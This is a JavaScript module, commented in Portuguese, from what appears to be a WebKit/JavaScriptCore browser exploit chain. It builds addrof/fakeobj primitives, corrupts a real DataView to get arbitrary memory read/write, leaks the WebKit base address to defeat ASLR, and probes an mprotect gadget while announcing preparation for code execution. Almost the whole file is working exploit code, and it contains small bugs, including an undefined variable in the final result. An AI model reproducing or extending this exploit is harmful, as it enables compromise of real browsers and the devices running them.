// js/script3/testArrayBufferVictimCrash.mjs (v22 - ASLR Leak da Structure de DataView Real)
// =======================================================================================
// ESTA VERSÃO FINALMENTE OBTEM O VAZAMENTO DE ASLR LENDO A STRUCTURE DE UM DATAVIEW REAL,
// APROVEITANDO AS PRIMITIVAS addrof/fakeobj E L/E UNIVERSAL AGORA FUNCIONAIS.
// 1. Validar primitivas OOB locais.
// 2. Estabilizar e validar addrof_core/fakeobj_core.
// 3. NOVO: Vazar a base ASLR da WebKit lendo o endereço da JSC::Structure de um DataView REAL.
// 4. Configurar e testar a PRIMITIVA DE L/E ARBITRÁRIA UNIVERSAL (via fakeobj DataView) usando o endereço REAL da Structure.
// 5. Testar e verificar a primitiva ARB R/W, incluindo leitura de gadgets.
// =======================================================================================

import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    getOOBDataView,
    clearOOBEnvironment,
    addrof_core,
    fakeobj_core,
    initCoreAddrofFakeobjPrimitives,
    arb_read, // Esta é a arb_read local (usa oob_dataview_real)
    arb_write, // Esta é a arb_write local (usa oob_dataview_real)
    selfTestOOBReadWrite,
    oob_read_absolute,
    oob_write_absolute,
    oob_array_buffer_real
} from '../core_exploit.mjs';

import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';

export const FNAME_MODULE = "v22 - ASLR Leak da Structure de DataView Real";

// Aumentando as pausas para maior estabilidade em sistemas mais lentos ou com GC agressivo
const LOCAL_VERY_SHORT_PAUSE = 10;
const LOCAL_SHORT_PAUSE = 100;
const LOCAL_MEDIUM_PAUSE = 750;
const LOCAL_LONG_PAUSE = 1500;
const LOCAL_SHORT_SHORT_PAUSE = 50;

const EXPECTED_BUTTERFLY_ELEMENT_SIZE = 8;
const OBJECT_PTR_TAG_HIGH = 0x402a0000;

let global_spray_objects = [];
let hold_objects = [];

let _fake_data_view = null; // A DataView real corrompida para ARB R/W universal


// Funções Auxiliares Comuns (dumpMemory)
async function dumpMemory(address, size, logFn, arbReadFn, sourceName = "Dump") {
    logFn(`[${sourceName}] Iniciando dump de ${size} bytes a partir de ${address.toString(true)}`, "debug");
    const bytesPerRow = 16;
    for (let i = 0; i < size; i += bytesPerRow) {
        let hexLine = address.add(i).toString(true) + ": ";
        let asciiLine = "  ";
        let rowBytes = [];

        for (let j = 0; j < bytesPerRow; j++) {
            if (i + j < size) {
                try {
                    const byte = await arbReadFn(address.add(i + j), 1, logFn);
                    rowBytes.push(byte);
                    hexLine += byte.toString(16).padStart(2, '0') + " ";
                    asciiLine += (byte >= 0x20 && byte >= 0x7E) ? String.fromCharCode(byte) : '.';
                } catch (e) {
                    hexLine += "?? ";
                    asciiLine += "?";
                    logFn(`[${sourceName}] ERRO ao ler byte em ${address.add(i + j).toString(true)}: ${e.message}`, "error");
                    for (let k = j + 1; k < bytesPerRow; k++) { hexLine += "?? "; asciiLine += "?"; }
                    break;
                }
            } else {
                hexLine += "   ";
                asciiLine += " ";
            }
        }
        logFn(`[${sourceName}] ${hexLine}${asciiLine}`, "leak");
    }
    logFn(`[${sourceName}] Fim do dump.`, "debug");
}

/**
 * Remove a tag de um AdvancedInt64 que representa um JSValue (ponteiro de objeto).
 * @param {AdvancedInt64} taggedAddr O AdvancedInt64 representando o JSValue taggeado.
 * @param {Function} logFn Função de log para depuração.
 * @returns {AdvancedInt64} O AdvancedInt64 com a tag removida.
 */
function untagJSValuePointer(taggedAddr, logFn) {
    if (!isAdvancedInt64Object(taggedAddr)) {
        logFn(`[Untagging] ERRO: Valor para untagging não é AdvancedInt64. Tipo: ${typeof taggedAddr}.`, "critical", "untagJSValuePointer");
        throw new TypeError("Valor para untagging não é AdvancedInt64.");
    }
    
    const original_high = taggedAddr.high();
    const untagged_high = original_high & 0x0000FFFF;
    
    if ((original_high & 0xFFFF0000) === (OBJECT_PTR_TAG_HIGH & 0xFFFF0000)) {
        return new AdvancedInt64(taggedAddr.low(), untagged_high);
    }
    logFn(`[Untagging] ALERTA: Tentou untaggar valor com high inesperado (0x${original_high.toString(16)}). Nenhuma tag removida. Valor: ${taggedAddr.toString(true)}`, "warn", "untagJSValuePointer");
    return taggedAddr;
}


export async function arb_read_universal_js_heap(address, byteLength, logFn) {
    const FNAME = "arb_read_universal_js_heap";
    if (!_fake_data_view) {
        logFn(`[${FNAME}] ERRO: Primitiva de L/E Universal (heap JS) não inicializada ou não estável.`, "critical", FNAME);
        throw new Error("Universal ARB R/W (JS heap) primitive not initialized.");
    }
    
    const current_fake_dv_addr = addrof_core(_fake_data_view);
    const m_vector_offset_in_fake_dv_obj = current_fake_dv_addr.add(JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET);

    const original_m_vector_of_fake_dv = await arb_read(m_vector_offset_in_fake_dv_obj, 8);
    await arb_write(m_vector_offset_in_fake_dv_obj, address, 8);

    let result = null;
    try {
        switch (byteLength) {
            case 1: result = _fake_data_view.getUint8(0); break;
            case 2: result = _fake_data_view.getUint16(0, true); break;
            case 4: result = _fake_data_view.getUint32(0, true); break;
            case 8:
                const low = _fake_data_view.getUint32(0, true);
                const high = _fake_data_view.getUint32(4, true);
                result = new AdvancedInt64(low, high);
                break;
            default: throw new Error(`Invalid byteLength for arb_read_universal_js_heap: ${byteLength}`);
        }
    } finally {
        await arb_write(m_vector_offset_in_fake_dv_obj, original_m_vector_of_fake_dv, 8);
    }
    return result;
}

export async function arb_write_universal_js_heap(address, value, byteLength, logFn) {
    const FNAME = "arb_write_universal_js_heap";
    if (!_fake_data_view) {
        logFn(`[${FNAME}] ERRO: Primitiva de L/E Universal (heap JS) não inicializada ou não estável.`, "critical", FNAME);
        throw new Error("Universal ARB R/W (JS heap) primitive not initialized.");
    }
    
    const current_fake_dv_addr = addrof_core(_fake_data_view);
    const m_vector_offset_in_fake_dv_obj = current_fake_dv_addr.add(JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET);

    const original_m_vector_of_fake_dv = await arb_read(m_vector_offset_in_fake_dv_obj, 8);
    await arb_write(m_vector_offset_in_fake_dv_obj, address, 8);

    try {
        switch (byteLength) {
            case 1: _fake_data_view.setUint8(0, Number(value)); break;
            case 2: _fake_data_view.setUint16(0, Number(value), true); break;
            case 4: _fake_data_view.setUint32(0, Number(value), true); break;
            case 8:
                let val64 = isAdvancedInt64Object(value) ? value : new AdvancedInt64(value);
                _fake_data_view.setUint32(0, val64.low(), true);
                _fake_data_view.setUint32(4, val64.high(), true);
                break;
            default: throw new Error(`Invalid byteLength for arb_write_universal_js_heap: ${byteLength}`);
        }
    } finally {
        await arb_write(m_vector_offset_in_fake_dv_obj, original_m_vector_of_fake_dv, 8);
    }
    return value;
}

// Funções para converter entre JS Double e AdvancedInt64 (do utils.mjs)
function _doubleToInt64_direct(double) {
    const buf = new ArrayBuffer(8);
    (new Float64Array(buf))[0] = double;
    const u32 = new Uint32Array(buf);
    return new AdvancedInt64(u32[0], u32[1]);
}

function _int64ToDouble_direct(int64) {
    const buf = new ArrayBuffer(8);
    const u32 = new Uint32Array(buf);
    const f64 = new Float64Array(buf);
    u32[0] = int64.low();
    u32[1] = int64.high();
    return f64[0];
}

/**
 * Tenta configurar a primitiva de leitura/escrita arbitrária universal usando um DataView real.
 * @param {Function} logFn Função de log.
 * @param {Function} pauseFn Função de pausa.
 * @param {object} JSC_OFFSETS_PARAM Offsets das estruturas JSC.
 * @returns {boolean} True se a primitiva foi configurada e testada com sucesso.
 */
async function setupUniversalArbitraryReadWrite(logFn, pauseFn, JSC_OFFSETS_PARAM) {
    const FNAME = "setupUniversalArbitraryReadWrite";
    logFn(`[${FNAME}] Tentando configurar a primitiva L/E Arbitrária Universal (DataView Real Corruption)...`, "subtest", FNAME);

    _fake_data_view = null;

    try {
        const real_data_view_obj = new DataView(new ArrayBuffer(0x1000));
        hold_objects.push(real_data_view_obj);
        _fake_data_view = real_data_view_obj;

        logFn(`[${FNAME}] DataView real criado em: ${addrof_core(_fake_data_view).toString(true)}`, "info", FNAME);

        const test_target_js_object = { test_prop: 0x11223344, second_prop: 0xAABBCCDD };
        hold_objects.push(test_target_js_object);
        const test_target_js_object_addr = addrof_core(test_target_js_object);

        logFn(`[${FNAME}] Realizando teste de sanidade L/E Universal no heap JS...`, "info", FNAME);
        const TEST_VALUE_UNIVERSAL = new AdvancedInt64(0xDEADBEEF, 0xCAFEBABE);
        await arb_write_universal_js_heap(test_target_js_object_addr, TEST_VALUE_UNIVERSAL, 8, logFn);
        const read_back_from_heap = await arb_read_universal_js_heap(test_target_js_object_addr, 8, logFn);
        
        if (read_back_from_heap.equals(TEST_VALUE_UNIVERSAL)) {
            logFn(`[${FNAME}] SUCESSO CRÍTICO: L/E Universal (heap JS) FUNCIONANDO!`, "vuln", FNAME);
            test_target_js_object.test_prop = TEST_VALUE_UNIVERSAL.low();
            return true;
        } else {
            logFn(`[${FNAME}] FALHA: L/E Universal (heap JS) INCONSISTENTE! Lido: ${read_back_from_heap.toString(true)}, Esperado: ${TEST_VALUE_UNIVERSAL.toString(true)}.`, "error", FNAME);
            return false;
        }

    } catch (e) {
        logFn(`[${FNAME}] ERRO durante configuração da L/E Universal: ${e.message}\n${e.stack || ''}`, "critical", FNAME);
        return false;
    } finally {
        // Não limpar _fake_data_view aqui, pois ele é a primitiva.
    }
}


// --- Funções Auxiliares para a Cadeia de Exploração UAF (Integradas) ---

// Função para forçar Coleta de Lixo
async function triggerGC(logFn, pauseFn) {
    logFn("    Acionando GC...", "info", "GC_Trigger");
    try {
        for (let i = 0; i < 500; i++) {
            new ArrayBuffer(1024 * 256);
        }
    } catch (e) {
        logFn("    Memória esgotada durante o GC Trigger, o que é esperado e bom (força GC).", "info", "GC_Trigger");
    }
    await pauseFn(LOCAL_SHORT_PAUSE);
    for (let i = 0; i < 25; i++) {
        new ArrayBuffer(1024);
    }
    await pauseFn(LOCAL_SHORT_PAUSE);
}

/**
 * Tenta um Type Confusion direto para obter primitivas addrof/fakeobj.
 * @param {Function} logFn Função de log.
 * @param {Function} pauseFn Função de pausa.
 * @param {object} JSC_OFFSETS_PARAM Offsets JSC.
 * @returns {Promise<boolean>} True se addrof/fakeobj foram estabilizados.
 */
async function stabilizeAddrofFakeobjPrimitives(logFn, pauseFn, JSC_OFFSETS_PARAM) {
    const FNAME = "stabilizeAddrofFakeobjPrimitives";
    logFn(`[${FNAME}] Iniciando estabilização de addrof_core/fakeobj_core via Heisenbug.`, "subtest", FNAME);

    initCoreAddrofFakeobjPrimitives();

    const NUM_STABILIZATION_ATTEMPTS = 5;
    for (let i = 0; i < NUM_STABILIZATION_ATTEMPTS; i++) {
        logFn(`[${FNAME}] Tentativa de estabilização #${i + 1}/${NUM_STABILIZATION_ATTEMPTS}.`, "info", FNAME);

        hold_objects = [];
        await triggerGC(logFn, pauseFn);
        logFn(`[${FNAME}] Heap limpo antes da tentativa de estabilização.`, "info", FNAME);
        await pauseFn(LOCAL_MEDIUM_PAUSE);

        try {
            let test_obj = { a: 0x11223344, b: 0x55667788 };
            hold_objects.push(test_obj);

            const addr = addrof_core(test_obj);
            logFn(`[${FNAME}] addrof_core para test_obj (${test_obj.toString()}) resultou em: ${addr.toString(true)}`, "debug", FNAME);

            if (!isAdvancedInt64Object(addr) || addr.equals(AdvancedInt64.Zero) || addr.equals(AdvancedInt64.NaNValue)) {
                logFn(`[${FNAME}] FALHA: addrof_core retornou endereço inválido para test_obj.`, "error", FNAME);
                throw new Error("addrof_core falhou na estabilização.");
            }

            const faked_obj = fakeobj_core(addr);
            
            const original_val = test_obj.a;
            faked_obj.a = 0xDEADC0DE;
            await pauseFn(LOCAL_VERY_SHORT_PAUSE);
            const new_val = test_obj.a;

            if (new_val === 0xDEADC0DE && test_obj.a === 0xDEADC0DE) {
                logFn(`[${FNAME}] SUCESSO: addrof_core/fakeobj_core estabilizados e funcionando!`, "good", FNAME);
                test_obj.a = original_val;
                return true;
            } else {
                logFn(`[${FNAME}] FALHA: addrof_core/fakeobj_core inconsistentes. Original: ${toHex(original_val)}, Escrito: ${toHex(0xDEADC0DE)}, Lido: ${toHex(new_val)}.`, "error", FNAME);
                throw new Error("fakeobj_core falhou na estabilização.");
            }
        } catch (e) {
            logFn(`[${FNAME}] Erro durante tentativa de estabilização: ${e.message}`, "warn", FNAME);
        }
    }

    logFn(`[${FNAME}] FALHA CRÍTICA: Não foi possível estabilizar as primitivas addrof_core/fakeobj_core após ${NUM_STABILIZATION_ATTEMPTS} tentativas.`, "critical", FNAME);
    return false;
}


export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, pauseFn, JSC_OFFSETS_PARAM) {
    const FNAME_CURRENT_TEST = "Teste Uaf Type Confusion";
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE;
    logFn(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Integração UAF/TC e Construção de ARB R/W Universal ---`, "test");

    let final_result = { success: false, message: "Exploração falhou ou não pôde ser verificada.", details: {} };
    const startTime = performance.now();
    let webkit_base_address = null;
    let found_m_mode = null;

    try {
        logFn("Limpeza inicial do ambiente OOB para garantir estado limpo...", "info");
        clearOOBEnvironment({ force_clear_even_if_not_setup: true });

        logFn("--- FASE 0: Validando primitivas arb_read/arb_write (OLD PRIMITIVE) com selfTestOOBReadWrite ---", "subtest");
        const arbTestSuccess = await selfTestOOBReadWrite(logFn);
        if (!arbTestSuccess) {
            const errMsg = "Falha crítica: As primitivas arb_read/arb_write (OLD PRIMITIVE) não estão funcionando. Abortando a exploração.";
            logFn(errMsg, "critical");
            throw new Error(errMsg);
        }
        logFn("Primitivas arb_read/arb_write (OLD PRIMITIVE) validadas com sucesso. Prosseguindo com a exploração.", "good");
        await pauseFn(LOCAL_MEDIUM_PAUSE);


        logFn("--- FASE 1: Estabilização Inicial do Heap (Spray de Objetos AGRESSIVO) ---", "subtest");
        const sprayStartTime = performance.now();
        const INITIAL_SPRAY_COUNT = 10000;
        logFn(`Iniciando spray de objetos (volume ${INITIAL_SPRAY_COUNT}) para estabilização inicial do heap e anti-GC...`, "info");
        for (let i = 0; i < INITIAL_SPRAY_COUNT; i++) {
            const dataSize = 50 + (i % 50) * 16;
            global_spray_objects.push({ id: `spray_obj_${i}`, val1: 0xDEADBEEF + i, val2: 0xCAFEBABE + i, data: new Array(dataSize).fill(i % 255) });
        }
        logFn(`Spray de ${global_spray_objects.length} objetos concluído. Tempo: ${(performance.now() - sprayStartTime).toFixed(2)}ms`, "info");
        logFn("Heap estabilizado inicialmente para reduzir realocations inesperadas pelo GC.", "good");
        await pauseFn(LOCAL_SHORT_PAUSE);

        logFn("--- FASE 2: Obtendo primitivas OOB e addrof/fakeobj com validações ---", "subtest");
        const oobSetupStartTime = performance.now();
        logFn("Chamando triggerOOB_primitive para configurar o ambiente OOB (garantindo re-inicialização)...", "info");
        await triggerOOB_primitive({ force_reinit: true });

        const oob_data_view = getOOBDataView();
        if (!oob_data_view) {
            const errMsg = "Falha crítica ao obter primitiva OOB. DataView é nulo.";
            logFn(errMsg, "critical");
            throw new Error(errMsg);
        }
        logFn(`Ambiente OOB configurado com DataView: ${oob_data_view !== null ? 'Pronto' : 'Falhou'}. Time: ${(performance.now() - oobSetupStartTime).toFixed(2)}ms`, "good");
        await pauseFn(LOCAL_SHORT_PAUSE);

        // Chamada para estabilizar addrof_core/fakeobj_core
        const addrof_fakeobj_stable = await stabilizeAddrofFakeobjPrimitives(logFn, pauseFn, JSC_OFFSETS_PARAM);
        if (!addrof_fakeobj_stable) {
            const errMsg = "Falha crítica: Não foi possível estabilizar addrof_core/fakeobj_core. Abortando exploração.";
            logFn(errMsg, "critical");
            throw new Error(errMsg);
        }
        logFn("Primitivas PRINCIPAIS 'addrof' e 'fakeobj' ESTABILIZADAS e robustas.", "good");
        await pauseFn(LOCAL_MEDIUM_PAUSE);


        // --- FASE 3: Configurando a Primitiva Universal ARB R/W (usando DataView Real) ---
        logFn("--- FASE 3: Configurando a Primitiva Universal ARB R/W (usando DataView Real) ---", "subtest");
        
        const universal_arb_rw_setup_success = await setupUniversalArbitraryReadWrite(logFn, pauseFn, JSC_OFFSETS_PARAM);
        if (!universal_arb_rw_setup_success) {
            const errMsg = "Falha crítica: Não foi possível configurar a primitiva Universal ARB R/W. Abortando exploração.";
            logFn(errMsg, "critical");
            throw new Error(errMsg);
        }
        logFn("Primitiva Universal ARB R/W CONFIGURADA e validada.", "good");
        await pauseFn(LOCAL_MEDIUM_PAUSE);


        // --- FASE 4: Vazamento de ASLR usando a primitiva Universal ARB R/W funcional ---
        logFn("--- FASE 4: Vazamento de ASLR usando arb_read_universal_js_heap ---", "subtest");
        
        // 1. Crie um DataView real (dummy) para obter o endereço da sua Structure.
        //    (real_data_view_obj já está em hold_objects da fase anterior).
        const dummy_data_view_for_structure_leak = new DataView(new ArrayBuffer(8)); // Objeto novo para leak de Structure
        hold_objects.push(dummy_data_view_for_structure_leak);
        const dummy_data_view_addr = addrof_core(dummy_data_view_for_structure_leak);
        logFn(`[ASLR LEAK] Endereço de DataView dummy para leak de Structure: ${dummy_data_view_addr.toString(true)}`, "info");

        // 2. Leia o ponteiro da Structure desse DataView dummy usando arb_read_universal_js_heap.
        //    O offset é JSCell.STRUCTURE_POINTER_OFFSET (0x8).
        const structure_pointer_offset_in_obj = dummy_data_view_addr.add(JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET);
        let tagged_data_view_structure_address = await arb_read_universal_js_heap(structure_pointer_offset_in_obj, 8, logFn);

        logFn(`[ASLR LEAK] Ponteiro DataView Structure LIDO (potencialmente taggeado): ${tagged_data_view_structure_address.toString(true)}`, "leak");

        // 3. Aplique o untagging ao endereço da Structure vazado.
        const data_view_structure_address_untagged = untagJSValuePointer(tagged_data_view_structure_address, logFn);

        if (!isAdvancedInt64Object(data_view_structure_address_untagged) || data_view_structure_address_untagged.equals(AdvancedInt64.Zero)) {
            const errMsg = `Falha na leitura/untagging do endereço da DataView Structure: ${data_view_structure_address_untagged.toString(true)}. Abortando ASLR leak.`;
            logFn(errMsg, "critical");
            throw new Error(errMsg);
        }
        logFn(`[ASLR LEAK] Endereço REAL (untagged) da DataView Structure: ${data_view_structure_address_untagged.toString(true)}`, "good");
        await pauseFn(LOCAL_SHORT_PAUSE);


        // 4. Calcule a base da WebKit subtraindo o offset do vtable da DataView Structure.
        //    O offset 0x3AD62A0 em config.mjs é o offset da vtable de DataView em relação à base da lib.
        const DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FROM_BASE = new AdvancedInt64(parseInt(JSC_OFFSETS_PARAM.DataView.STRUCTURE_VTABLE_OFFSET, 16), 0);
        webkit_base_address = data_view_structure_address_untagged.sub(DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FROM_BASE);

        if (webkit_base_address.equals(AdvancedInt64.Zero) || (webkit_base_address.low() & 0xFFF) !== 0x000) {
            const errMsg = `Base WebKit calculada (${webkit_base_address.toString(true)}) é inválida ou não alinhada. Abortando ASLR leak.`;
            logFn(errMsg, "critical");
            throw new Error(errMsg);
        }
        logFn(`SUCESSO: Endereço base REAL da WebKit OBTIDO: ${webkit_base_address.toString(true)}`, "good");

        // 5. Verificação de gadget com a base ASLR real
        const mprotect_plt_offset_check = new AdvancedInt64(parseInt(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["mprotect_plt_stub"], 16), 0);
        const mprotect_addr_check = webkit_base_address.add(mprotect_plt_offset_check);
        logFn(`Verificando gadget mprotect_plt_stub em ${mprotect_addr_check.toString(true)} (para validar ASLR).`, "info");
        const mprotect_first_bytes_check = await arb_read_universal_js_heap(mprotect_addr_check, 4, logFn); // Usar a primitiva universal
        
        if (mprotect_first_bytes_check !== 0 && mprotect_first_bytes_check !== 0xFFFFFFFF) {
            logFn(`LEITURA DE GADGET CONFIRMADA: Primeiros bytes de mprotect: ${toHex(mprotect_first_bytes_check)}. ASLR validado!`, "good");
        } else {
             logFn(`ALERTA: Leitura de gadget mprotect retornou zero ou FFFFFFFF. ASLR pode estar incorreto ou arb_read universal falhando para endereços de código.`, "warn");
        }
        await pauseFn(LOCAL_MEDIUM_PAUSE);


        logFn("--- FASE 5: Verificação Funcional de L/E e Teste de Resistência ao GC (Pós-ASLR Leak) ---", "subtest");
        const rwTestPostLeakStartTime = performance.now();

        const test_obj_post_leak = global_spray_objects.length > 0 ?
                                   global_spray_objects[Math.floor(global_spray_objects.length / 2)] :
                                   { test_val_prop: 0x98765432, another_prop: 0xABCDEF00 };
        hold_objects.push(test_obj_post_leak);
        logFn(`Objeto de teste escolhido do spray (ou novo criado) para teste pós-vazamento.`, "info");

        const test_obj_addr_post_leak = addrof_core(test_obj_post_leak);
        logFn(`Endereço do objeto de teste pós-vazamento: ${test_obj_addr_post_leak.toString(true)}`, "info");

        const faked_obj_for_post_leak_test = fakeobj_core(test_obj_addr_post_leak);
        if (!faked_obj_for_post_leak_test || typeof faked_obj_for_post_leak_test !== 'object') {
            throw new Error("Failed to recreate fakeobj for post-ASLR leak test.");
        }

        const original_val_prop = test_obj_post_leak.val1 || test_obj_post_leak.test_val_prop;
        logFn(`Valor original de 'val1'/'test_val_prop' no objeto de teste: ${toHex(original_val_prop)}`, 'debug');

        faked_obj_for_post_leak_test.val1 = 0x1337BEEF;
        await pauseFn(LOCAL_VERY_SHORT_PAUSE);
        const read_back_val_prop = faked_obj_for_post_leak_test.val1;

        if (test_obj_post_leak.val1 === 0x1337BEEF && read_back_val_prop === 0x1337BEEF) {
            logFn(`SUCESSO: Escrita/Leitura de propriedade via fakeobj (após vazamento ASLR) validada. Objeto original 'val1' agora é 0x1337BEEF.`, "good");
        } else {
            logFn(`FALHA: Escrita/Leitura de propriedade via fakeobj (após vazamento ASLR) inconsistente. Original 'val1': ${toHex(test_obj_post_leak.val1)}, Read via fakeobj: ${toHex(read_back_val_prop)}.`, "error");
            throw new Error("R/W verification post-ASLR leak failed.");
        }

        logFn("SUCESSO: Verificação de L/E pós-vazamento validada.", "good");

        logFn("Iniciando teste de resistência PÓS-VAZAMENTO: Executando L/E arbitrária universal múltiplas vezes...", "info");
        let resistanceSuccessCount_post_leak = 0;
        const numResistanceTests = 10;
        const butterfly_addr_of_spray_obj = test_obj_addr_post_leak.add(JSC_OFFSETS_PARAM.JSObject.BUTTERFLY_OFFSET);

        for (let i = 0; i < numResistanceTests; i++) {
            const test_value_arb_rw = new AdvancedInt64(0xCCCC0000 + i, 0xDDDD0000 + i);
            try {
                await arb_write_universal_js_heap(butterfly_addr_of_spray_obj, test_value_arb_rw, 8, logFn);
                const read_back_value_arb_rw = await arb_read_universal_js_heap(butterfly_addr_of_spray_obj, 8, logFn);

                if (read_back_value_arb_rw.equals(test_value_arb_rw)) {
                    resistanceSuccessCount_post_leak++;
                    logFn(`[Resistência PÓS-VAZAMENTO #${i}] SUCESSO: L/E arbitrária consistente no Butterfly.`, "debug");
                } else {
                    logFn(`[Resistência PÓS-VAZAMENTO #${i}] FALHA: L/E arbitrária inconsistente no Butterfly. Written: ${test_value_arb_rw.toString(true)}, Read: ${read_back_value_arb_rw.toString(true)}.`, "error");
                }
            } catch (resErr) {
                logFn(`[Resistência PÓS-VAZAMENTO #${i}] ERRO: Exceção durante L/E arbitrária no Butterfly: ${resErr.message}`, "error");
            }
            await pauseFn(LOCAL_VERY_SHORT_PAUSE);
        }
        if (resistanceSuccessCount_post_leak === numResistanceTests) {
            logFn(`SUCESSO TOTAL: Teste de resistência PÓS-VAZAMENTO concluído. ${resistanceSuccessCount_post_leak}/${numResistanceTests} operações bem-sucedidas.`, "good");
        } else {
            logFn(`ALERTA: Teste de resistência PÓS-VAZAMENTO concluído com ${numResistanceTests - resistanceSuccessCount_post_leak} falhas.`, "warn");
            final_result.message += ` (Teste de resistência L/E pós-vazamento com falhas: ${numResistanceTests - resistanceSuccessCount_post_leak})`;
        }
        logFn(`Verificação funcional de L/E e Teste de Resistência PÓS-VAZAMENTO concluídos. Time: ${(performance.now() - rwTestPostLeakStartTime).toFixed(2)}ms`, "info");


        logFn("++++++++++++ SUCESSO TOTAL! Todas as fases do exploit foram concluídas com sucesso. ++++", "vuln");
        final_result = {
            success: true,
            message: "Cadeia de exploração concluída. Leitura/Escrita arbitrária 100% funcional e verificada. Vazamento REAL de Base WebKit e preparação para ACE bem-sucedidos.",
            details: {
                webkitBaseAddress: webkit_base_address ? webkit_base_address.toString(true) : "N/A",
                mprotectGadget: mprotect_addr_real ? mprotect_addr_real.toString(true) : "N/A",
                foundMMode: found_m_mode ? toHex(found_m_mode) : "N/A"
            }
        };

    } catch (e) {
        final_result.message = `Exceção crítica na implementação funcional: ${e.message}\n${e.stack || ''}`;
        final_result.success = false;
        logFn(final_result.message, "critical");
    } finally {
        logFn(`Iniciando limpeza final do ambiente e do spray de objetos...`, "info");
        global_spray_objects = [];
        hold_objects = [];

        clearOOBEnvironment({ force_clear_even_if_not_setup: true });
        logFn(`Limpeza final concluída. Time total do teste: ${(performance.now() - startTime).toFixed(2)}ms`, "info");
    }

    logFn(`--- ${FNAME_CURRENT_TEST_BASE} Concluído. Resultado final: ${final_result.success ? 'SUCESSO' : 'FALHA'} ---`, "test");
    logFn(`Mensagem final: ${final_result.message}`, final_result.success ? 'good' : 'critical');
    if (final_result.details) {
        logFn(`Detalhes adicionais do teste: ${JSON.stringify(final_result.details)}`, "info");
    }

    return {
        errorOccurred: final_result.success ? null : final_result.message,
        addrof_result: { success: final_result.success, msg: "Primitiva addrof funcional." },
        webkit_leak_result: { success: final_result.success, msg: final_result.message, details: final_result.details },
        heisenbug_on_M2_in_best_result: 'N/A (UAF Strategy)',
        oob_value_of_best_result: 'N/A (UAF Strategy)',
        tc_probe_details: { strategy: 'UAF/TC -> ARB R/W' }
    };
}
